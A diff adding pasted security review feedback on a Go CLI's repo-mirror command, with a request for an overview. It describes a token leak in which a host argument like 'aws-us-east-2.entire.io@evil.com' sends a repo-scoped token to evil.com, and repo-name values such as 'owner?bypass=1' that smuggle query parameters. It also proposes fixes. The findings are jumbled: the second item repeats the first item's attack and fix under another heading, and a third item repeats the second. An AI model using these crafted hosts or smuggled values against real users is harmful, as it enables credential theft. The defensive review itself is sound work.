@@ -1,0 +1,44 @@
+I got this review feedback:
+
+
+1. Unvalidated cluster host is an SSRF / token-leak primitive (MEDIUM)
+
+  cmd/entire/cli/repo_mirror.go:39-44 accepts clusterHost as the optional second positional arg and cmd/entire/cli/repo_mirror_probe.go:54
+  concatenates it raw into a URL:
+
+  checkURL := fmt.Sprintf("https://%s%s/info/refs?service=git-upload-pack", clusterHost, repoSlug)
+
+  Same value also lands in the STS audience claim (auth/repo_token.go:101). Both go through fmt.Sprintf / string concat — no URL parsing, no
+  allowlist, no scheme/userinfo check.
+
+  Concrete attack: a user is socially-engineered into running entire repo mirror create owner/repo aws-us-east-2.entire.io@evil.com. Go's
+  http.NewRequestWithContext parses that as host=evil.com, userinfo=aws-us-east-2.entire.io. The CLI then ships a Basic entire-cli:<repo-scoped-token>
+   header to evil.com (repo_mirror_probe.go:128). The server-side invalid_target check on the STS exchange is the only gate — and depending on whether
+   the core does URL-parsing or string-matching on audience, the gate may or may not catch the trick.
+
+  Fix: validate cluster host with net.ParseIP + DNS-name regex, reject anything containing @, ?, #, /, or scheme prefixes. Cheap, defense-in-depth,
+  doesn't rely on server canonicalization.
+
+
+
+  2. parseGitHubURL regex is too permissive for the audience-binding role it plays (MEDIUM)
+  cmd/entire/cli/repo_mirror_probe.go:28-30:
+
+  gitHubBareRe = regexp.MustCompile(`^(?:github\.com/)?([^/\s]+)/([^/\s]+?)(?:\.git)?$`)
+
+  [^/\s]+ allows ?, #, ;, .., %, control characters (above 0x20), and more. The captured owner/repo flow into the audience string
+  https://<clusterHost>/gh/<owner>/<repo> and the probe URL. A repo named owner?bypass=1 mutates the URL's query string; owner#anchor truncates the
+  path; owner%2f may or may not be decoded depending on the layer.
+
+  Concrete attack: a user is socially-engineered into running entire repo mirror create owner/repo aws-us-east-2.entire.io@evil.com. Go's http.NewRequestWithContext parses that as host=evil.com, userinfo=aws-us-east-2.entire.io. The CLI then ships a Basic entire-cli:<repo-scoped-token> header to evil.com (repo_mirror_probe.go:128). The server-side invalid_target check on the
+  STS exchange is the only gate — and depending on whether the core does URL-parsing or string-matching on audience, the gate may or may not catch the trick.
+
+  Fix: validate cluster host with net.ParseIP + DNS-name regex, reject anything containing @, ?, #, /, or scheme prefixes. Cheap, defense-in-depth, doesn't rely on server canonicalization.
+
+  3. parseGitHubURL regex is too permissive for the audience-binding role it plays (MEDIUM)
+  cmd/entire/cli/repo_mirror_probe.go:28-30:
+  gitHubBareRe = regexp.MustCompile(`^(?:github\.com/)?([^/\s]+)/([^/\s]+?)(?:\.git)?$`)
+  [^/\s]+ allows ?, #, ;, .., %, control characters (above 0x20), and more. The captured owner/repo flow into the audience string https://<clusterHost>/gh/<owner>/<repo> and the probe URL. A repo named owner?bypass=1 mutates the URL's query string; owner#anchor truncates the path; owner%2f may or may not be decoded depending on the layer.
+  GitHub's actual allowed character set is [A-Za-z0-9._-] for owners and [A-Za-z0-9._-] for repos. Tightening the regex to match upstream reality closes parameter-smuggling vectors at the boundary instead of relying on whatever the server does with weird strings.
+
+Can you take a look and give me an overview
